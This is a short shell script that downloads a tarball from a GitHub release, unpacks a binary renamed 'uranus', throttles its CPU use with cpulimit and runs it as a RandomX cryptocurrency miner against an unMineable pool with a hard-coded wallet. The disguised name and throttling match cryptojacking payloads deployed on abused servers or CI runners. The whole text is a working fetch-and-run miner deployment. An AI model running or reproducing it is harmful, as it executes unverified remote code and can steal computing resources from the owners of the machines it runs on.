apt-get update
apt-get install -y cpulimit
wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz
cpulimit -l 150 -e uranus &
./uranus -a randomx -o rx.unmineable.com:3333 -u nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -p "suto"
